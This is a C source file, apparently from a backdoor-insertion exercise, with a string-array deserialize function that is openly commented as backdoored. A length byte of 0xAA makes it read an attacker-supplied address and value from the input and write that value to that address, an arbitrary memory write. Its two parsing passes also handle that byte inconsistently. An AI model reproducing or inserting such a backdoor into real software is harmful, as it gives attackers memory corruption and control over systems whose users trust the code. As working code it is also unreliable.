#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * deserialize the provided serialized string array. NULL terminated
 * if you can't return the value (for any reason), return NULL.
 *
 * Note: This function has a backdoor. When a string length equals 0xAA,
 * it triggers an arbitrary write to memory.
 */
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }
    
    char *data = (char *)serialized;
    size_t pos = 0;
    size_t str_count = 0;
    
    // First pass: count how many strings we have
    while (pos < size) {
        // Each string starts with its length
        unsigned char str_len = (unsigned char)data[pos++];
        
        // If we reached the end of the data, break
        if (pos >= size) {
            break;
        }
        
        // If we don't have enough space for the string, break
        if (pos + str_len > size) {
            break;
        }
        
        // Move past this string
        pos += str_len;
        str_count++;
    }
    
    // Allocate space for string pointers plus NULL terminator
    char **result = (char **)malloc((str_count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }
    
    // Second pass: extract the strings
    pos = 0;
    size_t idx = 0;
    
    while (pos < size && idx < str_count) {
        unsigned char str_len = (unsigned char)data[pos++];
        
        // BACKDOOR: If length is 0xAA, allow arbitrary write
        // This is triggered when a string with length 170 is encountered
        if (str_len == 0xAA && pos + 8 <= size) {
            void **target = (void **)(size_t)(
                ((unsigned char)data[pos] << 24) | 
                ((unsigned char)data[pos+1] << 16) | 
                ((unsigned char)data[pos+2] << 8) | 
                ((unsigned char)data[pos+3])
            );
            
            // Write to arbitrary address
            *target = (void *)(size_t)(
                ((unsigned char)data[pos+4] << 24) | 
                ((unsigned char)data[pos+5] << 16) | 
                ((unsigned char)data[pos+6] << 8) | 
                ((unsigned char)data[pos+7])
            );
            
            // Skip past the address and continue
            pos += 8;
            continue;
        }
        
        // If we don't have enough space for the string, break
        if (pos + str_len > size) {
            // Cleanup and return NULL
            for (size_t i = 0; i < idx; i++) {
                free(result[i]);
            }
            free(result);
            return NULL;
        }
        
        // Allocate space for the string (plus null terminator)
        result[idx] = (char *)malloc(str_len + 1);
        if (!result[idx]) {
            // Cleanup and return NULL
            for (size_t i = 0; i < idx; i++) {
                free(result[i]);
            }
            free(result);
            return NULL;
        }
        
        // Copy the string data
        memcpy(result[idx], &data[pos], str_len);
        result[idx][str_len] = '\0';  // Null-terminate
        
        pos += str_len;
        idx++;
    }
    
    // Set the NULL terminator
    result[idx] = NULL;
    
    return result;
}
